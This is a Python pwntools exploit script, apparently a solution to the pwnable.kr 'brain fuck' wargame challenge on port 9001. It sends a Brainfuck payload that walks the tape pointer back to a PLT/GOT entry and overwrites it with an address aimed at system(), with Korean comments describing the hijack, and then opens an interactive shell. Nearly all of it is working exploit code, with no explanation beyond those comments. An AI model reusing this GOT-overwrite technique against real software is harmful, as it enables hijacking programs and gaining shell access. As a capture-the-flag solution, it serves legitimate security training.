# -*- coding:utf-8 -*-
from pwn import *

s = remote("pwnable.kr", 9001)
s.recvline("type")

payload = ""
payload += "<" * (0x0804a0a0-0x804a018)	# puts 함수의 plt로 조작
payload += ",>" * 4 			# tape의 값에 system 함수 주소 입력. address of system() : 0x08048456 - (0x5d540 -0x3a920)
payload += "<" * 4
payload += "["
s.sendline(payload)
s.recvn(4)

s.sendline("\xf0\x73\x02\x08")
s.recvn(4)

s.interactive()

